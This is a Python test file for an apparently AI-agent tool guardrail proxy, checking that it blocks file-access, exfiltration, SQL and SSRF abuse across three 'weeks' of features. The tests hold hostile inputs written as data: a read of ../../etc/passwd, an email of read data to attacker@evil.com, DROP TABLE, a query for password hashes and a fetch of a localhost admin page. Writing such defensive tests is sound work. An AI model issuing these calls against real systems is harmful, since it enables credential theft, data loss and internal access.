from guardrail import GuardrailProxy

def run_test(name, test_fn):
    print(f"\n{'='*60}")
    print(f"TEST: {name}")
    print(f"{'='*60}")
    passed = test_fn()
    status = "PASS (Secured)" if passed else "FAIL (Vulnerable!)"
    print(f"--> RESULT: {status}")
    return passed

# --- WEEK 1 TESTS ---
def test_blocked_file():
    proxy = GuardrailProxy()
    return "ERROR" in proxy.execute_tool("read_file", filename="passwords.txt")

def test_path_traversal():
    proxy = GuardrailProxy()
    return "ERROR" in proxy.execute_tool("read_file", filename="../../etc/passwd")

def test_unknown_tool():
    proxy = GuardrailProxy()
    return "ERROR" in proxy.execute_tool("delete_database", table="users")

def test_taint_exfiltration():
    proxy = GuardrailProxy()
    proxy.execute_tool("read_file", filename="feedback.txt")
    return "ERROR" in proxy.execute_tool("send_email", to="attacker@evil.com", content="leaked_data")

def test_legitimate_workflow():
    proxy = GuardrailProxy()
    notes = proxy.execute_tool("read_file", filename="weekly_notes.txt")
    if "ERROR" in notes:
        return False
    res = proxy.execute_tool("send_email", to="manager@mycompany.com", content=notes.strip())
    return "SUCCESS" in res

# --- WEEK 2 TESTS ---
def test_dlp_secret_leak():
    proxy = GuardrailProxy()
    notes = proxy.execute_tool("read_file", filename="leaked_notes.txt")
    res = proxy.execute_tool("send_email", to="manager@mycompany.com", content=notes)
    return "ERROR" in res

def test_payload_size_limit():
    proxy = GuardrailProxy()
    huge_payload = "A" * 2500
    res = proxy.execute_tool("send_email", to="manager@mycompany.com", content=huge_payload)
    return "ERROR" in res

def test_rate_limiting():
    proxy = GuardrailProxy()
    for _ in range(5):
        proxy.execute_tool("read_file", filename="weekly_notes.txt")
    res = proxy.execute_tool("read_file", filename="weekly_notes.txt")
    return "ERROR" in res

# --- WEEK 3 TESTS ---
def test_sql_destructive_block():
    proxy = GuardrailProxy()
    res = proxy.execute_tool("query_db", sql="DROP TABLE products")
    return "ERROR" in res

def test_sql_restricted_table():
    proxy = GuardrailProxy()
    res = proxy.execute_tool("query_db", sql="SELECT username, password_hash FROM users")
    return "ERROR" in res

def test_sql_safe_select():
    proxy = GuardrailProxy()
    res = proxy.execute_tool("query_db", sql="SELECT name, price FROM products")
    return "Firewall Pro" in res

def test_ssrf_localhost_block():
    proxy = GuardrailProxy()
    res = proxy.execute_tool("fetch_url", url="http://127.0.0.1:8080/admin")
    return "ERROR" in res

def test_cross_tool_web_taint():
    proxy = GuardrailProxy()
    fetch_res = proxy.execute_tool("fetch_url", url="https://api.mycompany.com/news")
    if "ERROR" in fetch_res:
        return False
    # After fetching external web data, outbound email must be blocked by taint tracking
    email_res = proxy.execute_tool("send_email", to="manager@mycompany.com", content="Summary from web")
    return "ERROR" in email_res

if __name__ == "__main__":
    results = [
        run_test("1. [W1] Block Restricted Secret Files", test_blocked_file),
        run_test("2. [W1] Block Path Traversal (../)", test_path_traversal),
        run_test("3. [W1] Block Unauthorized Tools", test_unknown_tool),
        run_test("4. [W1] Taint Tracking Exfiltration Defense", test_taint_exfiltration),
        run_test("5. [W1] Legitimate Workflow + Human Approval", test_legitimate_workflow),
        run_test("6. [W2] Outbound DLP Secret & Credential Scanner", test_dlp_secret_leak),
        run_test("7. [W2] Oversized Payload Blocking", test_payload_size_limit),
        run_test("8. [W2] Rate Limiting / Infinite Loop Protection", test_rate_limiting),
        run_test("9. [W3] Block Destructive SQL (DROP/DELETE)", test_sql_destructive_block),
        run_test("10. [W3] Block Restricted DB Table (users)", test_sql_restricted_table),
        run_test("11. [W3] Allow Safe Read-Only SQL SELECT", test_sql_safe_select),
        run_test("12. [W3] Block SSRF Localhost Access", test_ssrf_localhost_block),
        run_test("13. [W3] Cross-Tool Web Taint Propagation", test_cross_tool_web_taint),
    ]
    print(f"\n{'#'*60}")
    print(f"FINAL SECURITY SCORE: {sum(results)}/{len(results)} TESTS PASSED")
    print(f"{'#'*60}")
